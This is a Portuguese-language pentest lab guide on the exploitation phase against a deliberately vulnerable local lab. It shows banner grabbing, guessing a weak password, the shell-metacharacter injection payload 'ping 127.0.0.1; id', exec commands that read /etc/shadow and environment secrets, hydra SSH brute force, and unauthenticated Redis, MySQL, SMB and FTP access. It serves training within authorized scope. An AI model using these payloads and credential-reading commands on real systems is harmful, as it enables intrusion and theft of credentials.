# 06 - Exploitation Guide

## üìã Vis√£o Geral

Ap√≥s enumerar servi√ßos e identificar vulnerabilidades, √© hora de **explorar** de forma controlada. Este guia foca em explora√ß√£o pr√°tica no ambiente do lab, sempre dentro do escopo autorizado.

**Tempo:** 30-40 minutos | **N√≠vel:** Intermedi√°rio/Avan√ßado

---

## üéØ Objetivos

- Explorar vulnerabilidades identificadas
- Capturar flags e evid√™ncias
- Praticar t√©cnicas de post-exploitation
- Documentar exploits de forma profissional

---

## ‚ö†Ô∏è Regra de Ouro

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  APENAS EM AMBIENTES AUTORIZADOS            ‚îÇ
‚îÇ  - Este lab (vuln-labs)                     ‚îÇ
‚îÇ  - CTFs p√∫blicos (HTB, THM)                 ‚îÇ
‚îÇ  - Pentest com contrato assinado            ‚îÇ
‚îÇ                                             ‚îÇ
‚îÇ  NUNCA sem autoriza√ß√£o por escrito!         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## üéØ Vulnerabilidades do Lab

### Vuln Service (10.89.0.12:9999)

| Vulnerabilidade | Severidade | T√©cnica |
|-----------------|------------|---------|
| Information Disclosure | üü° M√©dia | Banner grabbing |
| Weak Authentication | üü† Alta | Brute force / Guess |
| Command Injection | üî¥ Cr√≠tica | Shell metacharacters |
| Arbitrary Command Execution | üî¥ Cr√≠tica | Backdoor command |

### Outros Servi√ßos

| Servi√ßo | Vulnerabilidade | T√©cnica |
|---------|-----------------|---------|
| SSH | Weak password | Brute force |
| MySQL | Root sem restri√ß√µes | Connection + enumeration |
| Redis | No authentication | Direct access |
| SMB | Anonymous access | Share enumeration |
| FTP | Weak credentials | Anonymous/brute force |

---

## üíª Explora√ß√£o: Vuln Service

### Fase 1: Reconhecimento

```bash
# Port scan
nmap -sV -p 9999 lab_pyserver

# Banner grabbing
nc lab_pyserver 9999
```

**Banner revelado:**
```
VulnService v0.0.2 (Build 2025-12-07)
Running on: Alpine Linux 3.18
Python: 3.11.6
Admin Panel Access Available
Commands: help, login, ping, base64, exec, flag, exit
```

**Informa√ß√µes coletadas:**
- ‚úÖ Vers√£o do servi√ßo
- ‚úÖ Sistema operacional
- ‚úÖ Comandos dispon√≠veis
- ‚úÖ Painel admin existe

---

### Fase 2: Information Disclosure

```bash
# Conectar e explorar comandos
nc lab_pyserver 9999
```

**Comandos testados:**
```
> help
[Lista de comandos revelada]

> base64 test
[Funcionalidade confirmada]
```

**Achados:**
- Servi√ßo revela informa√ß√µes sens√≠veis no banner
- Comandos dispon√≠veis sem autentica√ß√£o (exceto admin)

---

### Fase 3: Weak Authentication

```bash
# Testar senhas comuns
nc lab_pyserver 9999
```

**Teste manual:**
```
> login admin
[-] Authentication failed!

> login password
[-] Authentication failed!

> login admin123
[+] Authentication successful!
```

**Credenciais v√°lidas:** `admin123`

---

### Fase 4: Command Injection (Ping)

```bash
# Ap√≥s autenticar
nc lab_pyserver 9999
```

**Payload de teste:**
```
> login admin123
[+] Authentication successful!

> ping 127.0.0.1; id
PING 127.0.0.1 (127.0.0.1): 56 data bytes
[...]
uid=0(root) gid=0(root) groups=0(root)
```

**Metacharacters que funcionam:**
- `;` - Separador de comandos
- `&&` - AND l√≥gico
- `||` - OR l√≥gico
- `|` - Pipe

---

### Fase 5: Arbitrary Command Execution

```bash
# Comando exec direto
nc lab_pyserver 9999
```

**Execu√ß√£o:**
```
> login admin123
[+] Authentication successful!

> exec whoami
root

> exec cat /etc/passwd
[Conte√∫do do arquivo]

> exec ps aux
[Processos rodando]

> exec cat /app/vuln_server.py
[C√≥digo fonte revelado!]
```

---

### Fase 6: Capturar Flag

```bash
nc lab_pyserver 9999
```

**Comandos:**
```
> login admin123
[+] Authentication successful!

> flag
[+] FLAG{nmap_lab_pwned}
```

**Flag capturada:** `FLAG{nmap_lab_pwned}`

---

## üîì Explora√ß√£o: Outros Servi√ßos

### SSH Brute Force

```bash
# Usando hydra (se instalado)
hydra -l admin -p admin ssh://lab_ssh:2222
```

**Credenciais:** `admin:admin`

---

### MySQL Root Access

```bash
# Conectar como root
mariadb -h lab_mysql -u root -prootpass --ssl=0

# Enumerar
SHOW DATABASES;
USE testdb;
SHOW TABLES;
```

**Achados:**
- Root sem restri√ß√µes de host
- Banco `testdb` acess√≠vel

---

### Redis No Auth

```bash
# Conectar sem senha
redis-cli -h lab_redis

# Comandos
PING
INFO server
CONFIG GET *
KEYS *
```

**Achados:**
- Sem autentica√ß√£o
- Acesso completo ao servidor

---

### SMB Anonymous Access

```bash
# Listar shares
smbclient -L //lab_smb -N --option='client min protocol=SMB2'

# Acessar share
smbclient //lab_smb/share -N --option='client min protocol=SMB2'

# Comandos
ls
get arquivo.txt
put malicious.txt
```

**Achados:**
- Share com acesso an√¥nimo
- Permiss√µes de leitura/escrita

---

### FTP Weak Credentials

```bash
# Conectar
ftp lab_ftp

# Credenciais
Name: ftpuser
Password: ftppass

# Comandos
ls
get file.txt
put payload.txt
```

---

## üéì Exerc√≠cios Pr√°ticos

### Exerc√≠cio 1: Explora√ß√£o Completa do Vuln Service

```bash
# Documentar cada fase
echo "=== EXPLOITATION REPORT ===" > exploit_report.txt

# 1. Banner
nc lab_pyserver 9999 < /dev/null >> exploit_report.txt

# 2. Autentica√ß√£o
echo "Testing auth..." >> exploit_report.txt

# 3. Command injection
# (manual)

# 4. Flag
# (documentar)
```

**Objetivo:** Relat√≥rio completo com todas as fases

---

### Exerc√≠cio 2: Exfiltra√ß√£o de Dados

```bash
# Via command injection
nc lab_pyserver 9999
```

**Comandos:**
```
> login admin123
> exec cat /etc/passwd > /tmp/passwd.txt
> exec cat /etc/shadow
> exec cat /app/vuln_server.py
> exec env
```

**Objetivo:** Coletar m√°ximo de informa√ß√µes do sistema

---

### Exerc√≠cio 3: Privilege Escalation (Simulado)

```bash
# J√° somos root no container, mas simular busca
nc lab_pyserver 9999
```

**Enumerar:**
```
> exec find / -perm -4000 2>/dev/null
> exec cat /etc/crontab
> exec ps aux
> exec netstat -tulpn
```

**Objetivo:** Identificar vetores de escala√ß√£o

---

## ‚ö†Ô∏è Boas Pr√°ticas

### ‚úÖ Fa√ßa

- Documente cada passo da explora√ß√£o
- Salve evid√™ncias (screenshots, logs)
- Teste em ordem: info ‚Üí auth ‚Üí exploit
- Valide cada vulnerabilidade manualmente
- Crie PoC reproduz√≠vel
- Relate de forma profissional

### ‚ùå N√£o Fa√ßa

- Explorar sem autoriza√ß√£o
- Causar dano ou DoS
- Modificar/deletar dados cr√≠ticos
- Deixar backdoors
- Compartilhar exploits de sistemas reais
- Omitir vulnerabilidades encontradas

---

## üîó Pr√≥ximos Passos

1. **Continue:** [07 - Reporting](07-reporting.md)
2. **Pratique:** Complete os 3 exerc√≠cios
3. **Documente:** Criar relat√≥rio completo
4. **Pesquise:** CVEs similares √†s vulnerabilidades encontradas

---

## üìñ Recursos

- [Exploit-DB](https://www.exploit-db.com/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Metasploit Unleashed](https://www.metasploitunleashed.com/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)